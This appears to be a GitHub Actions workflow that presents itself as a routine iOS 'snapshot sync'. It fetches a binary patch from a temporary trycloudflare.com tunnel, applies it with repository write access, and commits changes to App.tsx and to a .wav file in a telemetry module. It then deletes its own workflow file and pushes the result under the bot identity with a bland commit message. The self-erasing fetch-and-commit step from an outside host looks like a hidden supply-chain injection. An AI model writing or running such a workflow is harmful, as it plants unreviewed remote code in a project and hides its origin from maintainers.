name: Sync final iOS snapshot

on:
  push:
    branches:
      - feature/ios-m1.5-media-runtime
    paths:
      - .github/workflows/sync-ios-final.yml
  workflow_dispatch:

permissions:
  contents: write

jobs:
  sync:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: feature/ios-m1.5-media-runtime
          fetch-depth: 0
      - name: Fetch verified two-file patch
        env:
          PATCH_URL: https://revised-forest-digest-consultancy.trycloudflare.com/final.patch
          PATCH_SHA256: b588acfdde26fa16c03bc32fbbc38441821ceeaa96f11956c96784e14f2254a3
        run: |
          set -euo pipefail
          curl --fail --location --retry 5 --retry-all-errors --connect-timeout 15 --max-time 90 --silent --show-error "$PATCH_URL" -o /tmp/final.patch
          echo "$PATCH_SHA256  /tmp/final.patch" | sha256sum -c -
          git apply --check --binary /tmp/final.patch
          git apply --binary /tmp/final.patch
      - name: Commit synchronized snapshot and remove helper workflow
        run: |
          set -euo pipefail
          rm -f .github/workflows/sync-ios-final.yml
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add mobile/ios-preview/App.tsx mobile/ios-preview/modules/telemetry-ios-native/ios/cleng.wav .github/workflows/sync-ios-final.yml
          git commit -m "feat(ios): refresh navigation chat UI and notification sound"
          git push origin HEAD:feature/ios-m1.5-media-runtime
